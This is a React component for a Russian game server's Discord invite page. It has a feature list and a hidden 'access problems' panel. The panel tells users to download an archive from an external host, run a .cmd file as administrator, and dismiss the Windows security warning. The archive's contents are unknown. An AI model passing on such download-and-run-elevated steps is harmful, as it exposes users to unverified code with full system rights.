import React, { useState } from 'react';
import { FaComments, FaLightbulb, FaHandsHelping, FaExclamationTriangle, FaGamepad, FaInfoCircle } from 'react-icons/fa';

interface Feature {
  name: string;
  description: string;
  icon: React.ReactNode;
}

const FeatureCard: React.FC<Feature> = ({ name, description, icon }) => (
  <li className="bg-stone-800 rounded-xl p-4 shadow-md transition-all duration-300 hover:shadow-lg hover:scale-[1.02]">
    <div className="flex items-center mb-2">
      <span className="text-2xl mr-2 text-accent-500">{icon}</span>
      <h3 className="text-lg font-medium text-stone-200">{name}</h3>
    </div>
    <p className="text-stone-400">{description}</p>
  </li>
);

const UnlockerInstructions: React.FC = () => (
  <div className="mt-8 p-4 bg-yellow-900/30 rounded-xl">
    <h3 className="text-xl font-semibold text-yellow-500 mb-4">Инструкция по восстановлению доступа к Discord</h3>
    <p className="text-stone-300 mb-4">
      <strong>Внимание:</strong> Использование методов обхода блокировок может нарушать условия использования Discord и местное законодательство. Пользователи несут полную ответственность за свои действия.
    </p>
    <ol className="list-decimal list-inside text-stone-300 space-y-2">
      <li>Скачайте архив <a href="https://fastdl.vortexl4d4.ru/disunlock/DiscordUnlocker.7z" className="text-accent-500 hover:underline">Discord Unlocker</a>.</li>
      <li>Распакуйте архив в корень диска C:\ (путь не должен содержать пробелов).</li>
      <li>Откройте папку C:\DiscordUnlocker.</li>
      <li>Запустите &quot;Разблокировать Discord.cmd&quot; от имени администратора.</li>
      <li>Если появится предупреждение безопасности, нажмите &quot;Подробнее&quot; → &quot;Выполнить в любом случае&quot;.</li>
    </ol>
    <p className="text-stone-300 mt-4">
      Для удаления: запустите StopUnlocker.cmd от имени администратора и удалите папку C:\DiscordUnlocker.
    </p>
  </div>
);

export const DiscordInvite: React.FC<{ inviteLink: string }> = ({ inviteLink }) => {
  const [showUnlocker, setShowUnlocker] = useState(false);

  const discordFeatures: Feature[] = [
    { name: "Чат с игроками сервера", description: "Общайтесь в реальном времени с другими игроками, делитесь опытом и находите новых друзей.", icon: <FaComments /> },
    { name: "Игровая инфраструктура", description: "Получите доступ к своему балансу, очкам, перкам и привилегиям на сервере прямо через Discord.", icon: <FaGamepad /> },
    { name: "Предложения по улучшениям", description: "Делитесь своими идеями и участвуйте в развитии сервера. Ваш голос будет услышан!", icon: <FaLightbulb /> },
    { name: "Поддержка и помощь", description: "Получайте быструю помощь от опытных игроков и администрации по любым вопросам.", icon: <FaHandsHelping /> },
    { name: "Жалобы на игроков", description: "Сообщайте о нарушениях и помогайте поддерживать здоровую атмосферу в сообществе.", icon: <FaExclamationTriangle /> },
  ];

  return (
    <div>
      <p className="mb-8 text-lg leading-relaxed text-stone-300">
        Наше Discord сообщество - это центр общения и взаимодействия для всех игроков нашего сервера. 
        Здесь вы найдете единомышленников, получите поддержку и сможете влиять на развитие проекта.
      </p>

      <h2 className="text-2xl font-semibold mb-4 text-accent-500 pb-2 border-b-2 border-accent-500">Возможности нашего Discord сервера</h2>
      <ul className="space-y-3 mb-8">
        {discordFeatures.map((feature, index) => (
          <FeatureCard key={index} {...feature} />
        ))}
      </ul>

      <div className="text-center mt-8">
        <a 
          href={inviteLink}
          target="_blank"
          rel="noopener noreferrer"
          className="bg-accent-500 hover:bg-accent-400 text-stone-900 font-bold py-2 px-4 rounded-lg text-lg transition-colors duration-300"
        >
          Присоединиться к Discord
        </a>
      </div>

      <div className="mt-8 text-center">
        <button
          onClick={() => setShowUnlocker(!showUnlocker)}
          className="text-accent-500 hover:underline flex items-center justify-center mx-auto"
        >
          <FaInfoCircle className="mr-2" />
          {showUnlocker ? "Скрыть инструкцию" : "Проблемы с доступом? Нажмите здесь"}
        </button>
      </div>

      {showUnlocker && <UnlockerInstructions />}
    </div>
  );
};